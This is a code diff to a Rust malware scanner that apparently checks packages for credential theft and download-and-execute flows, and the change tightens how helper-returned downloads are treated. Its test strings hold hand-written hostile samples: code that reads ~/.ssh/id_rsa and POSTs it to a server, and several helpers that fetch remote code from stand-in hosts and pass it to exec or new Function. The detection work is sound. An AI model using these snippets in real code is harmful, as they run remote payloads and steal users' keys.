@@ -19,9 +19,10 @@
 //! `req.write(data)`), and a call of a function that returns a secret
 //! carries it (`collect()`). Wrappers are looked for twice, so a wrapper
 //! around a wrapper is seen and a third level is not; what a function
-//! returns is followed one level. Secrets only: with downloads the same
-//! summaries read setuptools' `download_svn(url)` as running what was
-//! fetched.
+//! returns is followed one level. A download that comes back from a call
+//! counts only at an in-process code sink (`exec(_transfer(u))`): at a
+//! process sink the summaries read setuptools' `download_svn(url)` and a
+//! `curl` wrapper as running what was fetched.
 //!
 //! shortcut: one namespace per file and no scopes, so two functions that
 //! reuse a name share its taint; a value kept in a global by one function
@@ -57,6 +58,8 @@ struct Origin {
     /// (`baseUrl(env)`) is one setting. False for anything derived
     /// (`JSON.stringify(env)`, `body.substring(…)`).
     alias: bool,
+    /// Came back from a call of a function of the file (`cx.returns`).
+    via_call: bool,
 }
 
 struct Stmt {
@@ -100,7 +103,8 @@ struct Cx<'a> {
     /// Functions of the file that return what one of their parameters holds
     /// (`collect(env)` that walks it): a call of one keeps the value.
     passers: Vec<String>,
-    /// Functions that return a secret: name, a call of it, what comes back.
+    /// Functions that return a secret or a download: name, a call of it,
+    /// what comes back.
     returns: Vec<(String, Regex, Kind, Origin)>,
 }
 
@@ -183,6 +187,13 @@ static CODE_SINK_JS: LazyLock<Regex> = LazyLock::new(|| {
 /// inline-code flag (`node -e`, `python -c`) or a shell.
 static INLINE_CODE: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r#"(?:(?:["'](?:node|python3?|bash|sh|zsh|perl|ruby|pwsh|powershell|cmd)(?:\.exe)?["']|process\.execPath)\s*,\s*\[?\s*["'](?:-e|-c|--eval|-Command|/c)["']|shell\s*[=:]\s*[Tt]rue)"#)
+        .unwrap()
+});
+
+/// The code sinks that run code in this process, not a program: the only
+/// ones a download returned by a call counts at.
+static IN_PROCESS: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"^(?:(?:^|[^\w.])(?:exec|compile|eval|Function)|new\s+Function|vm\.run\w*)\s*\("#)
         .unwrap()
 });
 
@@ -355,6 +366,15 @@ fn walk<'a>(
                     args.to_string()
                 };
                 if let Some((_, origin)) = carried(&args, s.line, taint, Some(kind), cx) {
+                    // A helper's download handed to a program (`os.system`,
+                    // `subprocess`) is setuptools' `download_svn(url)`.
+                    // An `exec(` inside a string is a script for another host.
+                    if name == DOWNLOAD_EXECUTE
+                        && origin.via_call
+                        && (!IN_PROCESS.is_match(m.as_str()) || in_literal(&s.text, m.start()))
+                    {
+                        continue;
+                    }
                     hit(origin, m.as_str());
                     found = true;
                     break;
@@ -500,7 +520,8 @@ fn on_client(text: &str, at: usize, cx: &Cx) -> bool {
 }
 
 /// Fills `cx.sink_funcs` and `cx.returns`: each function's statements are
-/// walked alone, once as they are (does a `return` carry a secret) and once
+/// walked alone, once as they are (does a `return` carry a secret or a
+/// download) and once
 /// per parameter with that parameter tainted (does it reach a network sink).
 fn summarize(stmts: &[Stmt], funcs: &[Func], cx: &mut Cx) {
     let inside = |s: &Stmt, f: usize| {
@@ -525,12 +546,9 @@ fn summarize(stmts: &[Stmt], funcs: &[Func], cx: &mut Cx) {
         .enumerate()
         .filter_map(|(i, f)| {
             let body = stmts.iter().filter(|s| inside(s, i));
-            match walk(body, &mut Taint::new(), cx) {
-                (_, Some((Kind::Secret, origin))) => {
-                    Some((f.name.clone(), call(&f.name), Kind::Secret, origin))
-                }
-                _ => None,
-            }
+            let (kind, mut origin) = walk(body, &mut Taint::new(), cx).1?;
+            origin.via_call = true;
+            Some((f.name.clone(), call(&f.name), kind, origin))
         })
         .collect();
     cx.returns = returns;
@@ -550,6 +568,7 @@ fn summarize(stmts: &[Stmt], funcs: &[Func], cx: &mut Cx) {
                     line: 0,
                     what: PARAM.to_string(),
                     alias: true,
+                    via_call: false,
                 };
                 let mut taint = Taint::from([(name.clone(), (Kind::Secret, origin))]);
                 let (hits, returned) = walk(stmts.iter().filter(|s| inside(s, i)), &mut taint, cx);
@@ -599,6 +618,22 @@ fn split_args(args: &str) -> Vec<&str> {
     }
     out.push(&args[start..]);
     out
+}
+
+/// Whether `at` falls inside a string literal of `text`.
+fn in_literal(text: &str, at: usize) -> bool {
+    let (mut quote, mut escaped) = (None, false);
+    for c in text[..at].chars() {
+        match quote {
+            Some(_) if escaped => escaped = false,
+            Some(_) if c == '\\' => escaped = true,
+            Some(q) if c == q => quote = None,
+            Some(_) => {}
+            None if matches!(c, '"' | '\'' | '`') => quote = Some(c),
+            None => {}
+        }
+    }
+    quote.is_some()
 }
 
 /// Parameter names by position. Python's `self` / `cls` are not arguments
@@ -663,7 +698,16 @@ fn carried(
         });
         let path = || secret_path(text).map(|what| (what, false));
         if let Some((what, alias)) = env.or_else(path) {
-            return Some((Kind::Secret, Origin { line, what, alias }));
+            let via_call = false;
+            return Some((
+                Kind::Secret,
+                Origin {
+                    line,
+                    what,
+                    alias,
+                    via_call,
+                },
+            ));
         }
     }
     if want.is_none() {
@@ -691,8 +735,14 @@ fn carried(
             let what = what
                 .trim_start_matches(|c: char| !c.is_alphanumeric())
                 .to_string();
-            let alias = false;
-            return Some((Kind::Download, Origin { line, what, alias }));
+            let (alias, via_call) = (false, false);
+            let origin = Origin {
+                line,
+                what,
+                alias,
+                via_call,
+            };
+            return Some((Kind::Download, origin));
         }
     }
     // Secrets first: a request built from a downloaded URL and a stolen
@@ -1426,16 +1476,43 @@ def main():
         let js = "function collect() {\n  const key = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'), 'utf8');\n  return { key };\n}\n\
                   fetch(URL, { method: 'POST', body: JSON.stringify(collect()) });\n";
         assert_eq!(names("lib/a.js", js), vec![CREDENTIAL_EXFIL]);
-        // Downloads are not summarised (setuptools' `download_svn(url)`), and
-        // what a function returns is followed one level (ansible-core).
-        let py = "def stage():\n    r = requests.get(URL)\n    return r.text\n\nexec(stage())\n";
-        assert!(names("setup.py", py).is_empty());
+        // What a function returns is followed one level (ansible-core).
         let two = "def docker_environment():\n    env = dict(os.environ)\n    return env\n\ndef podman_hostname():\n    out = raw_command(['podman', 'info'], env=docker_environment())\n    return out.strip()\n\nip = socket.gethostbyname(podman_hostname())\n";
         assert!(
             names("docker_util.py", two).is_empty(),
             "{:?}",
             flows("docker_util.py", two)
         );
+    }
+
+    /// A PyPI batch of 2026-11: a helper returns what it downloaded and the
+    /// caller runs it in this process. Written by hand, not copied.
+    #[test]
+    fn a_download_returned_by_a_helper_counts_only_in_process() {
+        let helper = "import urllib.request\ndef _transfer(url):\n    with urllib.request.urlopen(url, timeout=30) as resp:\n        payload = resp.read()\n    return payload\n\n";
+        for (path, src) in [
+            ("a.py", format!("{helper}def launch(url):\n    source = _transfer(url)\n    exec(compile(source, '<remote>', 'exec'), {{'__name__': '__main__'}})\n")),
+            ("b.py", format!("{helper}def launch():\n    payload = _transfer('https://cdn.example/x.py')\n    exec(payload.decode())\n")),
+            ("c.py", "def api_json(path):\n    return requests.get('https://cdn.example/api/' + path).json()\n\ndef run():\n    r = api_json('stage')\n    data = zlib.decompress(base64.b64decode(r['payload']))\n    exec(data)\n".to_string()),
+            ("d.py", "def _fetch_remote():\n    u = 'https://cdn.example/gh/x/y/z.py'\n    return requests.get(u).text\n\ndef main():\n    code = _fetch_remote()\n    exec(code, globals())\n".to_string()),
+            ("e.py", "def _load():\n    try:\n        return requests.get('https://cdn.example/x.bin').content\n    except Exception:\n        return EMBEDDED\n\nsrc = _decrypt(_load(), KEY)\nexec(src)\n".to_string()),
+            ("f.py", "def stage():\n    r = requests.get(URL)\n    return r.text\n\nexec(stage())\n".to_string()),
+            ("g.js", "async function load() {\n  const r = await fetch('https://cdn.example/x.js');\n  return r.text();\n}\nconst code = await load();\nnew Function(code)();\n".to_string()),
+        ] {
+            assert_eq!(names(path, &src), vec![DOWNLOAD_EXECUTE], "{path}");
+        }
+        // setuptools' `download_svn(url)` and a `curl` wrapper hand what they
+        // fetched to a program; a caller that saves or parses it runs nothing.
+        for (path, src) in [
+            ("a.py", format!("{helper}def unpack(url):\n    target = _transfer(url)\n    os.system('svn checkout -q %s %s' % (url, target))\n    subprocess.check_call(['tar', 'xf', target], shell=True)\n")),
+            ("b.py", "def cco(*args):\n    return subprocess.check_output(['curl', '-s', *args])\n\nout = cco('https://cdn.example/x.sh')\nsubprocess.check_call(out, shell=True)\nos.system(cco('https://cdn.example/y.sh'))\n".to_string()),
+            ("c.py", format!("{helper}data = _transfer('https://cdn.example/x.py')\nwith open('x.py', 'wb') as f:\n    f.write(data)\ncfg = json.loads(_transfer(URL))\nprint(cfg['name'])\n")),
+            ("d.js", "async function load() {\n  return (await fetch('https://cdn.example/x.sh')).text();\n}\nconst script = await load();\nexecSync(script);\nspawn('sh', ['-c', script]);\n".to_string()),
+            // A loader written for a remote host and sent over SSH.
+            ("e.py", "def auth():\n    return requests.post(URL, json=body).json()\n\ndef remote(target):\n    encoded = base64.b64encode(auth()['script'].encode()).decode()\n    runner = f\"import base64; exec(base64.b64decode({encoded!r}))\"\n    ssh(target, runner)\n".to_string()),
+        ] {
+            assert!(names(path, &src).is_empty(), "{path}: {:?}", flows(path, &src));
+        }
     }
 
     #[test]
